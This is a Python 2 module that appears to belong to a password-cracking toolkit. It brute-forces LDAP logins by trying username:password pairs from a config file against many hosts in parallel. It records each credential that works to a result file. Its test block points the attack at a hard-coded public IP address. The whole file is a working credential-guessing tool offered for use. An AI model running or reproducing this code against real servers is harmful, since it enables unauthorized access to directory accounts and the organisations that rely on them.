#coding=utf-8
import time
import threading
from printers import printPink,printGreen
from multiprocessing.dummy import Pool
import ldap

class ldap_burp(object):

    def __init__(self,c):
        self.config=c
        self.lock=threading.Lock()
        self.result=[]
        self.lines=self.config.file2list("conf/ldapd.conf")


    def ldap_connect(self,ip,username,password,port):
        creak=0
        try:
            ldappath='ldap://'+ip+':'+port+'/'
            l = ldap.initialize(ldappath)
            re=l.simple_bind(username,password)
            if re==1:
                creak=1
        except Exception,e:
            if e[0]['desc']=="Can't contact LDAP server":
                creak=2
            pass
        return creak

    def ldap_creak(self,ip,port):
            try:
                for data in self.lines:
                    username=data.split(':')[0]
                    password=data.split(':')[1]
                    flag=self.ldap_connect(ip,username,password,port)
                    if flag==2:
                        self.lock.acquire()
                        printGreen("%s ldap at %s can't connect\r\n" %(ip,port))
                        self.lock.release()
                        break

                    if flag==1:
                        self.lock.acquire()
                        printGreen("%s ldap at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.result.append("%s ldap at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.lock.release()
                        break
                    else:
                        self.lock.acquire()
                        print "%s ldap service 's %s:%s login fail " %(ip,username,password)
                        self.lock.release()
            except Exception,e:
                pass


    def run(self,ipdict,pinglist,threads,file):
        if len(ipdict['ldap']):
            printPink("crack ldap  now...")
            print "[*] start ldap  %s" % time.ctime()
            starttime=time.time()

            pool=Pool(threads)

            for ip in ipdict['ldap']:
                pool.apply_async(func=self.ldap_creak,args=(str(ip).split(':')[0],str(ip).split(':')[1]))
            pool.close()
            pool.join()

            print "[*] stop ldap serice  %s" % time.ctime()
            print "[*] crack ldap done,it has Elapsed time:%s " % (time.time()-starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i],file=file) 

if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from comm.config import *
    c=config()
    ipdict={'ldap': ['124.172.223.236:389']} 
    pinglist=['192.168.1.1']
    test=ldap_burp(c)
    test.run(ipdict,pinglist,50,file="../result/test")


